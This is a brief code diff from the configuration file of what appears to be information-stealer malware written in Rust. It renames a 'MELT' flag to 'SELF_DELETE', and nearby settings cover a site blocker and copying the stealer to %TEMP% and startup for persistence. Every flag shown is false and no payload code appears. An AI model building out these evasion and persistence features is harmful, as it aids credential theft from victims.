@@ -17,7 +17,7 @@ pub const SITE_BLOCKER: bool = false;
 pub const SITES_TO_BLOCK: &'static [&'static str] = &[];
 
 // Self deletes after execution
-pub const MELT: bool = false;
+pub const SELF_DELETE: bool = false;
 
 // Copies the stealer to %TEMP% and places to startup
 pub const COPY_TO_TEMP: bool = false;
